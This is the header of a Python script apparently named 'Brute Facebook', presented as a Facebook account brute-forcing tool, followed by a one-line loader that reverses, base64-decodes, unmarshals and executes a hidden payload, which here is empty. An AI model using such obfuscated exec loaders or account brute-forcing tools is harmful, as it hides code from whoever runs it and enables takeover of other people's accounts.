#######################################################
# Name           : Brute Facebook (BF)                #
# File           : bruto.py                             #
# Author         : Dela Drayton ID.        #
# Github         : https://github.com/HAXZOR007-Cyber        #
# Facebook       : https://www.facebook.com/profile.php?id=100040500966629   #
# Website        : blm ada          #
# Python version : 3.2                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))